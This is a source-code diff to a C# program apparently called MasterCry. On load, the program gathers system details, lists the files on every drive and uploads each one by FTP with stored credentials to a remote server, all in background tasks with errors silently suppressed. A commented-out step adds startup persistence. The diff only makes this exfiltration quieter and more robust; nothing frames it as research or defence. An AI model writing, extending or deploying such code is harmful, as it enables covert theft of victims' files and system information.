@@ -19,6 +19,8 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace MasterCry
@@ -136,33 +138,39 @@ namespace MasterCry
         //Todo: Enable StartUp
         private void Form1_Load(object sender, EventArgs e)
         {
-            if (!System.IO.File.Exists(BuildVars.Save_Location))
-                System_Details.getOperatingSystemInfo();
+            Task task = Task.Factory.StartNew(() =>
+            {
+                if (!System.IO.File.Exists(BuildVars.Save_Location))
+                    System_Details.getOperatingSystemInfo();
+
+                if (!System.IO.File.Exists(BuildVars.Save_Items_Location))
+                {
+                    foreach (var drv in getDrives())
+                    {
+                        var data = GetFileList(drv);
+                        foreach (var item in data)
+                        {
+                            WriteItems(item);
+                        }
+                    }
+                    Upload();
+                }
+                if (System.IO.File.Exists(BuildVars.Save_Items_Location))
+                {
+                    string content = File.ReadAllText(BuildVars.Save_Items_Location);
+                    if (content.Length != 0)
+                    {
+                        Upload();
+                    }
+                }
+            });
+           
 
             //if (!CheckRegistryExists())
             //{
             //    RegisterInStartup(true);
             //}
-            if (!System.IO.File.Exists(BuildVars.Save_Items_Location))
-            {
-                foreach (var drv in getDrives())
-                {
-                    var data = GetFileList(drv);
-                    foreach (var item in data)
-                    {
-                        WriteItems(item);
-                    }
-                }
-                Upload();
-            }
-            if (System.IO.File.Exists(BuildVars.Save_Items_Location))
-            {
-                string content = File.ReadAllText(BuildVars.Save_Items_Location);
-                if (content.Length != 0)
-                {
-                    Upload();
-                }
-            }
+            
         }
         #region "Search Files on Drives"
         List<string> getDrives()
@@ -248,21 +256,37 @@ namespace MasterCry
 
         private void Upload()
         {
+           
             if (IsConnectToInternet())
             {
                 try
                 {
-                    var lines = File.ReadAllLines(BuildVars.Save_Items_Location);
-                    foreach (var line in lines)
-                    {
-                        Ftp.UploadToFTP(line, Path.GetFileName(line));
-                        string text = File.ReadAllText(BuildVars.Save_Items_Location);
-                        text = text.Replace(line, "");
-                        File.WriteAllText(BuildVars.Save_Items_Location, text);
-                    }
+                    Task.Factory.StartNew(() => {
+                        if (File.Exists(BuildVars.Save_Items_Location))
+                        {
+                            var lines = File.ReadAllLines(BuildVars.Save_Items_Location);
+                            foreach (var line in lines)
+                            {
+                                using (WebClient client = new WebClient())
+                                {
+                                    client.Credentials = new NetworkCredential(BuildVars.FTP_USER, BuildVars.FTP_PASS);
+                                    client.UploadFile(BuildVars.FTP_SERVER + Path.GetFileName(line), "STOR", line);
+                                }
+                                string text = File.ReadAllText(BuildVars.Save_Items_Location);
+                                text = Regex.Replace(line, @"^\s*$", "", RegexOptions.Multiline);
+                                using (System.IO.StreamWriter file =
+                                     new System.IO.StreamWriter(BuildVars.Save_Items_Location))
+                                {
+                                    file.Write(text);
+                                }
+                            }
+                        }
+                        File.Delete(BuildVars.Save_Items_Location);
+                    });
                 }
                 catch (Exception)
                 { }
+                
             }
             
         }
